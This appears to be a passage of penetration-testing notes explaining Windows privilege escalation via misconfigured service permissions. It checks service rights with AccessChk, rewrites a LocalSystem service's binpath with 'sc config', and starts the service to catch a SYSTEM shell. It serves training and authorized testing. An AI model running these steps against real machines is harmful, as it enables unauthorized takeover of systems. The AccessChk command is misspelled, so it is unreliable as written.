# Insecure Service Permissions
This is a technique which leverages misconfigurations in the service permissions for a specific user. If permissions for a specific user differ from the ones above, then they may manifest as a possible vulnerability.

To identify such services, it is useful to use WinPEAS as mentioned above.
![](Resources/Images/WinPEAS%20daclsvc.png)

The permissions a user has on a specific service can be inspected via the [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) Windows Utility. 

```powershell
acceschk.exe /accepteula -uwcqv <account> <service> 
```

![](Resources/Images/Access%20Check%20Permissions.png)

It appears that `user` has write access to the service `daclsvc` and can also start the service.  We can query the service to see what user account is actually executing it:

```powershell
sc qc <service>
```

![](Resources/Images/Query%20Service.png)

It appears that the service is running as `LocalSystem` which is an account with more privileges than our `user` account. If we can write to the service, then we can alter its configuration and change the path to the executable which is supposed to be run:

```powershell
sc config <service> binpath="\"<path>\""
```

![](Resources/Images/Change%20Config.png)

All we now need to do is setup a listener and run the service:
```powershell
net start <service>
```

And we get a system shell back:

![](Resources/Images/Shell.png)
